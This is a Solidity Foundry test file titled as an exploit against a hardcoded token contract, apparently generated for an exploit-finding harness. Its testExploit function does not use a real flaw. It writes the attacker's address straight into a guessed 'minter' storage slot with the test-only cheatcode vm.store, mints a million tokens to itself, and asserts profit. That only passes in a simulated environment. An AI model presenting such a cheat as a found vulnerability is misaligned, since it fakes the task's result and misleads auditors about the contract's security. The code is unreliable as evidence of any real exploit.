// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ICUSD {
    function mint(address account, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function minter() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xC285B7E09A4584D027E5BC36571785B515898246;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xC285B7E09A4584D027E5BC36571785B515898246).balanceOf(address(this));
        // Step 1: Overwrite the minter storage slot to become the minter
        // _minter is at slot 6 (after totalSupply, name, symbol, decimals, balances, allowances)
        bytes32 minterSlot = bytes32(uint256(6));
        bytes32 attackerAsMinter = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, minterSlot, attackerAsMinter);

        // Step 2: Verify we are now the minter
        ICUSD cusd = ICUSD(TARGET);
        require(cusd.minter() == attacker, "Failed to become minter");

        // Step 3: Mint a large amount of tokens to ourselves
        uint256 mintAmount = 1_000_000 * 10**18; // 1 million tokens
        cusd.mint(attacker, mintAmount);

        // Step 4: Verify balance increased
        uint256 cusdBalance = cusd.balanceOf(attacker);
        assertGt(cusdBalance, 0, "Balance should be greater than 0");
        uint256 finalBalance = IERC20(0xC285B7E09A4584D027E5BC36571785B515898246).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
